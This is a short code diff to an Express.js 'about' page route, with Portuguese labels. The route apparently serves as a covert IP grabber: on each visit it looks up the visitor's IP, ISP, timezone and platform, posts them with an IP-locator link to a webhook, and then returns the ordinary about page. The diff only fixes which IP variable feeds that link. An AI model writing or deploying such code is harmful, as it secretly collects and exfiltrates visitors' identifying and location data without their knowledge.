@@ -52,7 +52,6 @@ app.get("/sobre", async (req, res) => {
         operadoraorg = data1.org;
         timezone = data1.timezone;
         totalISP = data1.as;
-        ip = data1.query;
       })
     const userAgent = req.headers["user-agent"];
     const platforma = userAgent ? userAgent.split("(")[1].split(")")[0] : "Desconhecido?";
@@ -66,7 +65,7 @@ app.get("/sobre", async (req, res) => {
         .addField("> **Operadora: **", totalISP || "Sem dados")
         .addField("> **IP: **", ipAddress || "Sem dados")
         .addField("> **Plataforma**", platforma || "Sem dados")
-        .addField("> **Link para o IP Locator**", `[ABRIR LINK](https://iplocation.io/ip/${ip})` || "Sem dados")
+        .addField("> **Link para o IP Locator**", `[ABRIR LINK](https://iplocation.io/ip/${ipAddress})` || "Sem dados")
         .setColor("#f37a0c")
       await sendWebhook(embed);
       res.sendFile(path.join(__dirname, 'public', 'about.html'));
